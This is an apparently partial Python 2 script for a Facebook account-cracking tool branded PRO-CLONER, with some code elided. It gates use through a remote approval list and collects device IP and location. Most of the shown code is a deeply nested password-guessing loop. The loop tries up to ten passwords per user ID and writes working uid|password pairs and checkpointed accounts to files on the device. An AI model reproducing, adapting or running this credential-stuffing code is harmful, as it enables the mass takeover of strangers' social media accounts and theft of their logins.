...
os.system('git pull')
os.system('clear')
logo = ('\x1b[1;91m _______           _______           _______  _______\n\x1b[1;92m(  ____ \|\     /|(  ___  )|\     /|(  ___  )(  ____ \ \n\x1b[1;93m| (    \/| )   ( || (   ) || )   ( || (   ) || (    \/\n\x1b[1;94m| (_____ | (___) || |   | || (___) || (___) || |\n\x1b[1;95m(_____  )|  ___  || |   | ||  ___  ||  ___  || | ____    \n\x1b[1;96m      ) || (   ) || |   | || (   ) || (   ) || | \_  ) \n\x1b[1;97m/\____) || )   ( || (___) || )   ( || )   ( || (___) |\n\x1b[1;91m\_______)|/     \|(_______)|/     \||/     \|(_______)\n\x1b[1;96m------------------------------------------------------\n\x1b[1;92mAUTHOR   : *SHOHAG-AHSAN-JOY* \n\x1b[1;93mFACEBOOK : SHOHAG.AHSAN.JOY.OFFICIAL.01\n\x1b[1;95mGITHUB   : https//:github.com/Shohagahsanjoy\n\x1b[1;96mTOOLS    : PRO-CLONER\n\x1b[1;92m------------------------------------------------------\n\x1b[1;92m       **MY ATTITUDE DEPENDS ON WHO YOU ARE !**\n\x1b[1;97m------------------------------------------------------')

def reg():
    os.system('clear')
    print logo
    print ''
    print '\x1b[1;33;1mAccess For This Tools Get Approval First '
    print ''
    time.sleep(1)
    try:
        to = open('/sdcard/.Shohag.txt', 'r').read()
    except (KeyError, IOError):
        reg2()

    r = requests.get('https://raw.githubusercontent.com/Shohagahsanjoy/ok-xxx/main/Server.txt').text
    if to in r:
        ...
        os.system('clear')
        print logo
        print '\t           \x1b[1;96mApproved Failed'
        print '------------------------------------------------------'
        print ' \x1b[1;91mYour Id Is Not Approved '
        print '------------------------------------------------------'
        print ' \x1b[1;92mCopy the id and send to Admin'
        print '------------------------------------------------------'
        print ' \x1b[1;93mYour id : ' + to
        print '------------------------------------------------------'
        raw_input('\x1b[1;95m Press enter to send id')
        os.system('xdg-open https://wa.me/+8801644124048')
        reg()
...
def reg2():
    ...
    id = str(uuid.uuid1(uuid.getnode(),0))[24:].upper() + "~Shohag=="
    print '------------------------------------------------------'
    print ' Your id:> \x1b[1;93m' + id 
    print '------------------------------------------------------'
    print ''
    raw_input(' \x1b[1;96mPress enter to go to whatsapp ')
    os.system('xdg-open https://wa.me/+8801644124048')
...
def ip():
    os.system('clear')
    print logo
    print '\t         \x1b[1;96m Collecting device info'
    print 53 * '-'
    try:
    ...
    time.sleep(1)
    print '\x1b[1;96m Your country: ' + country
    time.sleep(1)
    print '\x1b[1;95m Your region: ' + regi
    time.sleep(1)
    print ' \x1b[1;93mYour network: ' + network
    time.sleep(1)
...
def log_menu():
    try:
        ...
        os.system('clear')
        print logo
        print '\x1b[1;93m                  ~~~~ Login menu ~~~~\x1b[1;96m'
        print 53 * '-'
...
def log_menu_s():
    s = raw_input(' \x1b[1;95m\xe2\x95\xb0\xe2\x94\x80Selact\xe2\x9e\xa4 ')
    if s == '1':
        log_fb()
    elif s == '2':
        log_token()
...
def log_token():
    ...
    print 54 * '-'
    tok = raw_input(' \x1b[1;92mPaste token here: \x1b[1;96m')
    print 54 * '-'
...
def menu():
    ...
    os.system('clear')
    print logo
    tok = open('/sdcard/.Shohag.txt', 'r').read()
    ...
    print '\x1b[1;93m[2] Crack with Number password 6'
    print '\x1b[1;96m[3] Crack with Name + Number password 8'
    print '\x1b[1;95m[4] Extract File'
...
def menu_s():
    ms = raw_input('\x1b[1;97m\xe2\x95\xb0\xe2\x94\x80Selact\xe2\x9e\xa4 ')
    if ms == '1':
        auto_crack()
    elif ms == '2':
        choice_crack()
...
def crack():
    ...
    print '\x1b[1;93m[3] File cloning'
...
def a_s():
    ...
    cps = []
    oks = []
    a_s = raw_input(' \x1b[1;97m\xe2\x95\xb0\xe2\x94\x80Selact\xe2\x9e\xa4 ')
    if a_s == '1':
        os.system('clear')
        print logo
    ...
    time.sleep(0.5)
    print 54 * '-'
    print '\t\x1b[1;94mShohag Ahsan Joy\x1b[1;91m'
    print 54 * '-'
    ...
    def main(arg):
        ...
        try:
            ...
            q = json.loads(data)
            if 'loc' in q:
                print '\x1b[1;92m[SHOHAG-OK] \x1b[1;32m' + uid + ' | ' + pass1 + '\x1b[0;97m'
                ok = open('/sdcard/ids/SHOHAG_OK.txt', 'a')
                ok.write(uid + ' | ' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
            elif 'www.facebook.com' in q['error']:
                print '\x1b[1;31;1m[SHOHAG-CP] ' + uid + ' | ' + pass1
                cp = open('SHOHAG_CP.txt', 'a')
                cp.write(uid + ' | ' + pass1 + '\n')
                cp.close()
                ...
                q = json.loads(data)
                if 'loc' in q:
                    print '\x1b[1;92m[SHOHAG-OK] \x1b[1;32m' + uid + ' | ' + pass2 + '\x1b[0;97m'
                    ok = open('/sdcard/ids/SHOHAG_OK.txt', 'a')
                    ok.write(uid + ' | ' + pass2 + '\n')
                    ok.close()
                    oks.append(uid + pass2)
                elif 'www.facebook.com' in q['error']:
                    print '\x1b[1;31;1m[SHOHAG-CP] ' + uid + ' | ' + pass2
                    cp = open('SHOHAG_CP.txt', 'a')
                    cp.write(uid + ' | ' + pass2 + '\n')
                    cp.close()
                    ...
                    q = json.loads(data)
                    if 'loc' in q:
                        print '\x1b[1;92m[SHOHAG-OK] \x1b[1;32m' + uid + ' | ' + pass3 + '\x1b[0;97m'
                        ok = open('/sdcard/ids/SHOHAG_OK.txt', 'a')
                        ok.write(uid + ' | ' + pass3 + '\n')
                        ok.close()
                        oks.append(uid + pass3)
                    elif 'www.facebook.com' in q['error']:
                        print '\x1b[1;31;1m[SHOHAG-CP] ' + uid + ' | ' + pass3
                        cp = open('SHOHAG_CP.txt', 'a')
                        cp.write(uid + ' | ' + pass3 + '\n')
                        cp.close()
                        ...
                        q = json.loads(data)
                        if 'loc' in q:
                            print '\x1b[1;92m[SHOHAG-OK] \x1b[1;32m' + uid + ' | ' + pass4 + '\x1b[0;97m'
                            ok = open('/sdcard/ids/SHOHAG_OK.txt', 'a')
                            ok.write(uid + ' | ' + pass4 + '\n')
                            ok.close()
                            oks.append(uid + pass4)
                        elif 'www.facebook.com' in q['error']:
                            print '\x1b[1;31;1m[SHOHAG-CP] ' + uid + ' | ' + pass4
                            cp = open('SHOHAG_CP.txt', 'a')
                            cp.write(uid + ' | ' + pass4 + '\n')
                            cp.close()
                            ...
                            q = json.loads(data)
                            if 'loc' in q:
                                print '\x1b[1;92m[SHOHAG-OK] \x1b[1;32m' + uid + ' | ' + pass5 + '\x1b[0;97m'
                                ok = open('/sdcard/ids/SHOHAG_OK.txt', 'a')
                                ok.write(uid + ' | ' + pass5 + '\n')
                                ok.close()
                                oks.append(uid + pass5)
                            elif 'www.facebook.com' in q['error']:
                                print '\x1b[1;31;1m[SHOHAG-CP] ' + uid + ' | ' + pass5
                                cp = open('SHOHAG_CP.txt', 'a')
                                cp.write(uid + ' | ' + pass5 + '\n')
                                cp.close()
                                ...
                                q = json.loads(data)
                                if 'loc' in q:
                                    print '\x1b[1;92m[SHOHAG-OK] \x1b[1;32m' + uid + ' | ' + pass6 + '\x1b[0;97m'
                                    ok = open('/sdcard/ids/SHOHAG_OK.txt', 'a')
                                    ok.write(uid + ' | ' + pass6 + '\n')
                                    ok.close()
                                    oks.append(uid + pass6)
                                elif 'www.facebook.com' in q['error']:
                                    print '\x1b[1;31;1m[SHOHAG-CP] ' + uid + ' | ' + pass6
                                    cp = open('SHOHAG_CP.txt', 'a')
                                    cp.write(uid + ' | ' + pass6 + '\n')
                                    cp.close()
                                    ...
                                    q = json.loads(data)
                                    if 'loc' in q:
                                        print '\x1b[1;92m[SHOHAG-OK] \x1b[1;32m' + uid + ' | ' + pass7 + '\x1b[0;97m'
                                        ok = open('/sdcard/ids/SHOHAG_OK.txt', 'a')
                                        ok.write(uid + ' | ' + pass7 + '\n')
                                        ok.close()
                                        oks.append(uid + pass7)
                                    elif 'www.facebook.com' in q['error']:
                                        print '\x1b[1;31;1m[SHOHAG-CP] ' + uid + ' | ' + pass7
                                        cp = open('SHOHAG_CP.txt', 'a')
                                        cp.write(uid + ' | ' + pass7 + '\n')
                                        cp.close()
                                        ...
                                        q = json.loads(data)
                                        if 'loc' in q:
                                            print '\x1b[1;92m[SHOHAG-OK] \x1b[1;32m' + uid + ' | ' + pass8 + '\x1b[0;97m'
                                            ok = open('/sdcard/ids/SHOHAG_OK.txt', 'a')
                                            ok.write(uid + ' | ' + pass8 + '\n')
                                            ok.close()
                                            oks.append(uid + pass8)
                                        elif 'www.facebook.com' in q['error']:
                                            print '\x1b[1;31;1m[SHOHAG-CP] ' + uid + ' | ' + pass8
                                            cp = open('SHOHAG_CP.txt', 'a')
                                            cp.write(uid + ' | ' + pass8 + '\n')
                                            cp.close()
                                            ...
                                            q = json.loads(data)
                                            if 'loc' in q:
                                                print '\x1b[1;92m[SHOHAG-OK] \x1b[1;32m' + uid + ' | ' + pass9 + '\x1b[0;97m'
                                                ok = open('/sdcard/ids/SHOHAG_OK.txt', 'a')
                                                ok.write(uid + ' | ' + pass9 + '\n')
                                                ok.close()
                                                oks.append(uid + pass9)
                                            elif 'www.facebook.com' in q['error']:
                                                print '\x1b[1;31;1m[SHOHAG-CP] ' + uid + ' | ' + pass9
                                                cp = open('SHOHAG_CP.txt', 'a')
                                                cp.write(uid + ' | ' + pass9 + '\n')
                                                cp.close()
                                                ...
                                                q = json.loads(data)
                                                if 'loc' in q:
                                                    print '\x1b[1;92m[SHOHAG-OK] \x1b[1;32m' + uid + ' | ' + pass10 + '\x1b[0;97m'
                                                    ok = open('/sdcard/ids/SHOHAG_OK.txt', 'a')
                                                    ok.write(uid + ' | ' + pass10 + '\n')
                                                    ok.close()
                                                    oks.append(uid + pass10)
                                                elif 'www.facebook.com' in q['error']:
                                                    print '\x1b[1;31;1m[SHOHAG-CP] ' + uid + ' | ' + pass10
                                                    cp = open('SHOHAG_CP.txt', 'a')
                                                    cp.write(uid + ' | ' + pass10 + '\n')
                                                    cp.close()
...
def c_s():
    ...
    if a_s == '1':
        ...
        pass2 = raw_input(' \x1b[1;93m[2]Password: ')
        pass3 = raw_input(' \x1b[1;94m[3]Password: ')
...
def n_s():
    ...
    if a_s == '1':
        ...
        pass6 = raw_input(' \x1b[1;97m[6]Password: ')
        pass7 = raw_input(' \x1b[1;92m[7]Password: ')
        pass8 = raw_input(' \x1b[1;93m[8]Password: ')
        try:
            idlist = raw_input('[+] File Name: ')
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())
